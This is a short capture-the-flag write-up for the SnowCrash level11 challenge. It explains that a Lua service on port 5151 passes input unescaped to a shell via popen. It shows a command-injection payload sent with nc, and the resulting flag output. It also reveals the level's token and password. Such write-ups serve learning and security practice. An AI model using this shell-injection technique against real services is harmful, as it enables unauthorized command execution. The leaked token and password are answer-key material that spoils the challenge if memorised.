On login we can see a lua file that is currently running,
by looking over the code we can send over the port 5151 a password that will be diff with a sha1, we can assume that this password is the token.

But no, it use popen, that will simply concat the variable and execute the shell command `"echo "..pass.." | sha1sum"`
And without protecting it by any means, so we can inject anything like this exploit;

```
level11@SnowCrash:~$ echo '; getflag | wall' | nc localhost 5151

Broadcast Message from flag11@Snow
        (somewhere) at 23:26 ...

Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

Erf nope..
```

We can associate it to something like a SQL injection.


btw the correct 'password' is NotSoEasy
